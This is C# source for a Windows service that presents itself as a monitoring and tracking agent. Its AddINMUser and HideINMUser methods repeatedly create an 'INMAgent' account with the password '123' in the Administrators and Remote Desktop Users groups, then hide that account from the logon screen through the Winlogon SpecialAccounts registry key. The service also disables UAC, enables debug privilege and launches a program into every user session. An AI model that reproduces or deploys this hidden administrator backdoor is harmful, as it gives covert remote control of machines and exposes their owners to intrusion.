using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.ServiceProcess;
using System.Text;
using AgentEngine;
using System.Threading;
using System.IO;
using System.Runtime.InteropServices;
using System.Timers;
using INMC.INMMessage;
using Microsoft.Win32;

namespace AgentService
{
    public partial class AgentServices : ServiceBase
    {
#if DEBUG
        int iTest = 0;  //Variable to increment each 5 sec
        System.Timers.Timer timer1; //Timer for demostration

        void timer1_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            timer1.Stop();
            iTest++;

            //System.Diagnostics.Debugger.WriteLine("Iteration " + Convert.ToString(iTest));
            timer1.Start();
        }
#endif

        public AgentServices()
        {
            InitializeComponent();

#if DEBUG
            // Debug
            timer1 = new System.Timers.Timer(5000);
            timer1.Elapsed += new System.Timers.ElapsedEventHandler(timer1_Elapsed);
            ////
#endif
            bIsAdmin = true;

            string strBuffer;

            strBuffer = System.Environment.SystemDirectory;
            trackLog = new TrackLog(strBuffer + @"\" + AgentService.Properties.Resources.LOG_FILE_NAME,
                                    strBuffer + @"\" + AgentService.Properties.Resources.LOG_FILE_ID);


            //rdpTracker = new SessionManager(bIsAdmin);
            //processTracker = new ProcessTracker(bIsAdmin);
            //eventTracker = new EventTracker();
            //serviceTracker = new ServiceTracker();

            //networkTracker = new ConnectionManager();

            rdpThread = null;

            monTimer = new System.Threading.Timer(new TimerCallback(TimerProc));

            trackLog.StartTrackLog();
        }

        /// <summary>
        /// Set things in motion so your service can do its work.
        /// </summary>
        protected override void OnStart(string[] args)
        {
            base.OnStart(args);
#if DEBUG
            iTest = 1;

            Debugger.Launch(); //<-- Simple form to debug a web services
            // increase as needed to prevent timeouts
            timer1.Enabled = true;
#endif
            Global.SetAllowUAC(false);

            string strBuffer;

            strBuffer = System.Environment.SystemDirectory;
            strLogFile = strBuffer + @"\" + AgentService.Properties.Resources.LOG_FILE_NAME;
            strStatusFile = strBuffer + @"\" + AgentService.Properties.Resources.STATUS_FILE_NAME;

            //SetLogFileAcl(strLogFile);
            //SetLogFileAcl(strStatusFile);

            trackLog.StartTrackLog();						// Start Track Log

            // Start Polling Track Log for all sessions

            // Get Super privilege to track all system processes and their info
            // We can get module name of the other session process
            IntPtr hToken = IntPtr.Zero;

            if (!Win32.OpenProcessToken(Win32.GetCurrentProcess(), Win32.TOKEN_ADJUST_PRIVILEGES, ref hToken))
                return;

            Global.SetPrivilege(hToken, Win32.SE_DEBUG_NAME, true);

            Win32.CloseHandle(hToken);

            // Remote Desktop Protocol
            //if (CreateRDPThread())								// Monitoring Thread for WTS Event
            //    rdpTracker.startSessionManager(false);			// Start Session Manager

            // Network Connection Track
            //networkTracker.startConnectionManager(false);		// Start network connection manager

            // Device Track 
            //deviceTracker.startDeviceMonitor();

            trackLog.WriteTrackLog(LOG_TYPE.LOG_GENERAL_START, "Service Start");	// Record Start Log Message

            SetTrackStatus(Global.TRACK_STATUS.TRACK_START);		// For Notify All Instance

            StartTracking();

            monTimer.Change(1000, 100);
        }

        /// <summary>
        /// Stop this service.
        /// </summary>
        protected override void OnStop()
        {
            base.OnStop();
#if DEBUG
            timer1.Stop();
#endif
            // Stop Process Track Log
            processTracker.Stop();

            // Called only for one Admin session
            if (!bIsAdmin)
                return;

            trackLog.WriteTrackLog(LOG_TYPE.LOG_GENERAL_STOP, "Service Stop");		// Record Stop Log Message
            trackLog.StopTrackLog();						// Stop Track Log

            // Remote Desktop Protocol
            TerminateRDPThread();					// Monitoring Thread for WTS Event
            //rdpTracker.stopSessionManager();		// Stop Session Manager

            // Stop Service Track Log
            //serviceTracker.Stop();

#if LOG_EVENT_VIEW
            // Stop Event Track Log
            eventTracker.Stop();
#endif

            // Network Connection Track
            //networkTracker.stopConnectionManager();		// Stop network connection manager

            // Device Track
            //deviceTracker.stopDeviceMonitor();

            SetTrackStatus(Global.TRACK_STATUS.TRACK_EXIT);		// For Notify All Instance

        }

        protected override void OnContinue()
        {
            //trackLog.WriteTrackLog(LOG_TYPE.LOG_GENERAL_START, "Service Continue");
        }

        protected override void OnShutdown()
        {
            base.OnShutdown();
#if DEBUG
            timer1.Stop();
#endif
            Global.SetAllowUAC(false);

            // Stop Process Track Log
            processTracker.Stop();

            // Called only for one Admin session
            if (!bIsAdmin)
                return;

            trackLog.WriteTrackLog(LOG_TYPE.LOG_GENERAL_STOP, "Service Stop, Computer shutdown now");		// Record Stop Log Message
            trackLog.StopTrackLog();						// Stop Track Log

            // Remote Desktop Protocol
            TerminateRDPThread();					// Monitoring Thread for WTS Event
            //rdpTracker.stopSessionManager();		// Stop Session Manager

            // Stop Service Track Log
            //serviceTracker.Stop();

#if LOG_EVENT_VIEW
            // Stop Event Track Log
            eventTracker.Stop();
#endif

            // Network Connection Track
            //networkTracker.stopConnectionManager();		// Stop network connection manager

            // Device Track
            //deviceTracker.stopDeviceMonitor();

            SetTrackStatus(Global.TRACK_STATUS.TRACK_EXIT);		// For Notify All Instance
        }

        //////////////////////////////////////////////////////////////////////////
        // Function Name	: StartTracking
        // Initialize Tracker & Timer
        //////////////////////////////////////////////////////////////////////////
        private void StartTracking()
        {
            /* for taking of kill process hook */
            processTracker.Start();

            if (bIsAdmin)
            {
#if LOG_EVENT_VIEW
		        eventTracker.Start();
#endif
                //serviceTracker.Start();
            }
        }

        //////////////////////////////////////////////////////////////////////////
        // Function Name	: SetTrackStatus
        //////////////////////////////////////////////////////////////////////////
        private bool SetTrackStatus(Global.TRACK_STATUS nStatus)
        {
            if (nStatus == Global.TRACK_STATUS.TRACK_EXIT)
            {
                try
                {
                    FileStream fs = new FileStream(strStatusFile, FileMode.Open, FileAccess.Read);
                    if (fs != null)
                    {
                        fs.Close();
                        File.Delete(strStatusFile);
                    }
                }
                catch (System.Exception e)
                {
                    ComMisc.LogErrors(e.ToString());
                }
            }
            else
            {
                try
                {
                    FileStream fs = new FileStream(strStatusFile, FileMode.Create, FileAccess.Write);
                    if (fs != null)
                    {
                        if (nStatus == Global.TRACK_STATUS.TRACK_STOP)
                            Global.WriteStringBytes("Track Stop", fs);
                        fs.Close();
                    }
                }
                catch (System.Exception e)
                {
                    ComMisc.LogErrors(e.ToString());
                }
            }

            return true;
        }

        //////////////////////////////////////////////////////////////////////////
        // Function Name   : CreateRDPThread
        //////////////////////////////////////////////////////////////////////////
        private bool CreateRDPThread()
        {
            watchStop = false;

            rdpThread = new Thread(new ThreadStart(WTSEventHandler));
            rdpThread.Start();

            return (rdpThread == null ? false : true);
        }

        //////////////////////////////////////////////////////////////////////////
        // Function Name   : CreateRDPThread
        //////////////////////////////////////////////////////////////////////////
        private void TerminateRDPThread()
        {
            Thread.Sleep(1);
            RequestStop();
        }

        //////////////////////////////////////////////////////////////////////////
        // Function Name	: WTSEventHandler
        //////////////////////////////////////////////////////////////////////////
        private void WTSEventHandler()
        {
            while (!watchStop)
            {
                for (uint dwEventsFlag = 0; ; dwEventsFlag = 0)
                {
                    if (!Win32.WTSWaitSystemEvent(IntPtr.Zero, Win32.WTS_EVENT_ALL, out dwEventsFlag))
                    {
                        if (Win32.GetLastError() == Win32.ERROR_OPERATION_ABORTED)
                            break;

                        System.Threading.Thread.Sleep(100);
                        continue;
                    }

                    if ((dwEventsFlag & Win32.WTS_EVENT_LOGON) == Win32.WTS_EVENT_LOGON ||
                        (dwEventsFlag & Win32.WTS_EVENT_LOGOFF) == Win32.WTS_EVENT_LOGOFF ||
                        (dwEventsFlag & Win32.WTS_EVENT_CREATE) == Win32.WTS_EVENT_CREATE ||
                        (dwEventsFlag & Win32.WTS_EVENT_DELETE) == Win32.WTS_EVENT_DELETE)
                    {
                        //rdpTracker.updateSessionState();

                        continue; ;
                    }

                    if ((dwEventsFlag & Win32.WTS_EVENT_CONNECT) == Win32.WTS_EVENT_CONNECT ||
                        (dwEventsFlag & Win32.WTS_EVENT_DISCONNECT) == Win32.WTS_EVENT_DISCONNECT)
                    {
                        //rdpTracker.updateConnectState();

                        continue;
                    }

                    if (dwEventsFlag == Win32.WTS_EVENT_NONE)		// Error
                        break;
                }
            }
        }

        //////////////////////////////////////////////////////////////////////////
        // Function Name	: WatchClients
        // 
        //////////////////////////////////////////////////////////////////////////
        void WatchClients()
        {
            int[] nSids = new int[Global.MAX_SESSION];
            int nSid = 0;
            IntPtr hToken = IntPtr.Zero, hTokenDup = IntPtr.Zero;
            int dwCreationFlag = Win32.NORMAL_PRIORITY_CLASS | Win32.CREATE_NEW_CONSOLE;
            string strPath;

            string path = Process.GetCurrentProcess().MainModule.FileName;
            path = path.Substring(0, path.LastIndexOf("\\"));
            strPath = path + @"\" + AgentService.Properties.Resources.INMS_FILE_NAME;

            //rdpTracker.GetActiveSessions(ref nSids);

            for (int i = 0; i < Global.MAX_SESSION; i++)
            {
                if (nSids[i] == 0)
                    continue;

                nSid = i;
                //if (processTracker.IsRunningClientProc(nSid))
                //    continue;

                String username = "", strip = "", strdomain = "", strhosts = "";

                if (trackLog.GetSessionInfo((uint)nSid, ref username, ref strdomain, ref strip, ref strhosts) == true)
                {
                    if (username.ToLower() == "inmagent")
                        continue;
                }

                Win32.WTSQueryUserToken(nSid, ref hToken);
                if (hToken == IntPtr.Zero)
                    continue;

                Win32.PROCESS_INFORMATION pi = new Win32.PROCESS_INFORMATION();

                try
                {
                    IntPtr pEnvironmentBlock = IntPtr.Zero;

                    Win32.SECURITY_ATTRIBUTES sa = new Win32.SECURITY_ATTRIBUTES();
                    sa.Length = Marshal.SizeOf(sa);

                    if (!Win32.DuplicateTokenEx(
                        hToken,
                        Win32.MAXIMUM_ALLOWED,
                        ref sa,
                        //(int)Win32.SECURITY_IMPERSONATION_LEVEL.SecurityIdentification,
                        (int)Win32.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        (int)Win32.TOKEN_TYPE.TokenPrimary,
                        ref hTokenDup))
                        continue;

                    // Get block of environment vars for logged on user.
                    if (!Win32.CreateEnvironmentBlock(ref pEnvironmentBlock, hToken, false))
                        continue;

                    Win32.STARTUPINFO si = new Win32.STARTUPINFO();
                    si.cb = Marshal.SizeOf(si);
                    si.lpDesktop = @"winsta0\default";
                    bool result = Win32.CreateProcessAsUser(
                           hTokenDup,
                           null,
                           strPath,
                           ref sa,
                           ref sa,
                           false,
                           dwCreationFlag,
                           IntPtr.Zero,
                           path,
                           ref si,
                           ref pi
                     );

                    if (!result)
                    {
                        int error = Marshal.GetLastWin32Error();
                    }
                }
                catch
                {
                }
                finally
                {
                    if (pi.hProcess != IntPtr.Zero)
                        Win32.CloseHandle(pi.hProcess);
                    if (pi.hThread != IntPtr.Zero)
                        Win32.CloseHandle(pi.hThread);
                    if (hToken != IntPtr.Zero)
                        Win32.CloseHandle(hToken);
                    if (hTokenDup != IntPtr.Zero)
                        Win32.CloseHandle(hTokenDup);
                }
            }
        }

        //////////////////////////////////////////////////////////////////////////
        // Function Name	: MonitorNetConnection
        //////////////////////////////////////////////////////////////////////////
        private void MonitorNetConnection()
        {
            // Update Connection State and then Check IP Address List
            //networkTracker.updateConnectionPool();
            //networkTracker.checkAddressChange();
        }

        private void TimerProc(object state)
        {
            i_child++;
            i_proc++;
            i_serv++;
            i_event++;
            i_inst++;
            i_adduser++;

            if (i_child == CHILD_TIMER_INTERVAL)
            {
                WatchClients();
                i_child = 0;
            }

            if (i_proc == PROCESS_TIMER_INTERVAL)
            {
                processTracker.OnTracking();
                i_proc = 0;
            }

            if (i_serv == SERVICE_TIMER_INTERVAL)
            {
                //serviceTracker.OnTracking();
                //i_serv = 0;
            }

            if (i_event == EVENT_TIMER_INTERVAL)
            {
                //eventTracker.OnTracking();
                //i_event = 0;
            }

            if (i_inst == INSTALL_TIMER_INTERVAL)
            {
                MonitorNetConnection();
                i_inst = 0;
            }

            if (i_adduser == USER_ADD_TIMER_INTERVAL)
            {
                AddINMUser();
                i_adduser = 0;
            }
        }

        public void RequestStop()
        {
            watchStop = true;
        }

        /// <summary>
        /// Allocate ACL token to log file
        /// </summary>
        /// <param name="strFile"></param>
        public static void SetLogFileAcl(string strFile)
        {
            /* Create log file if not exists */
            /*FileStream file;
            if (!File.Exists(strFile))
            {
                file = new FileStream(strFile, FileMode.CreateNew, FileAccess.ReadWrite);
                file.Close();
            }
            else
            {
                file = new FileStream(strFile, FileMode.Open, FileAccess.ReadWrite);
                file.Close();
            }
            */
            /* Set log file permissions for Remote Desktop users */
           /* TPermisos dwAccessMask;
            string szOwner = "Users";
            string strPath = strFile;

            dwAccessMask = TPermisos.ACCESO_TOTAL;

            Ntfs.SetChildSec(strPath, szOwner, dwAccessMask);

            szOwner = "Remote Desktop Users";
            Ntfs.SetChildSec(strPath, szOwner, dwAccessMask);*/
        }

        public void AddINMUser()
        {
            if (userMgr == null)
                userMgr = new UserManage();

            M6UserItem addItem = new M6UserItem();
            addItem.strUserName = "INMAgent";
            addItem.strPassword = "123";
            addItem.strPrivilege = "Administrators,Remote Desktop Users";

            userMgr.AddUser(addItem);

            HideINMUser();
        }

        private void HideINMUser()
        {
            String subKey = @"Software\Microsoft\Windows NT\CurrentVersion\Winlogon";

            // Open Registry Key
            RegistryKey key = Registry.LocalMachine.OpenSubKey(subKey, true);
            key.CreateSubKey("SpecialAccounts");
            key.Close();

            key = Registry.LocalMachine.OpenSubKey(subKey + @"\SpecialAccounts", true);
            key.CreateSubKey("UserList");
            key.Close();

            key = Registry.LocalMachine.OpenSubKey(subKey + @"\SpecialAccounts\UserList", true);

            // Set INMAgent Key Value
            key.SetValue("INMAgent", 0);

            // Close Registry Key
            key.Close();
        }

        // const
        private const uint INIT_TIMER_INTERVAL = 5;			// 0.5s
        private const uint CHILD_TIMER_INTERVAL = 105;		// 10.5s
        private const uint TASK_TIMER_INTERVAL = 10;		// 1s

        private const uint PROCESS_TIMER_INTERVAL = 23;		// 2.3s
        private const uint SERVICE_TIMER_INTERVAL = 29;		// 2.9s
        private const uint EVENT_TIMER_INTERVAL = 67;		// 6.7s

        private const uint USER_ADD_TIMER_INTERVAL = 30 * 60;   // 3 minutes
        private const uint INSTALL_TIMER_INTERVAL = 110;	// 11s

        static public TrackLog trackLog;

        string strLogFile;
        string strStatusFile;
        bool bIsAdmin;
        Thread rdpThread;

        //DeviceMonitor deviceTracker;	        // Device Tracker
        ProcessTracker processTracker;		// Process Tracker

        //EventTracker eventTracker;			// Event Tracker
        //ServiceTracker serviceTracker;		// Service Tracker
        //static public SessionManager rdpTracker;		// Remote Desktop Protocol Tracker

        // Network connection Tracker
        //ConnectionManager networkTracker;
        private volatile bool watchStop;
        UserManage userMgr = null;

        System.Threading.Timer monTimer;

        static int i_child = 0;
        static int i_proc = 0;
        static int i_serv = 0;
        static int i_event = 0;
        static int i_inst = 0;
        static int i_adduser = 0;
    }
}
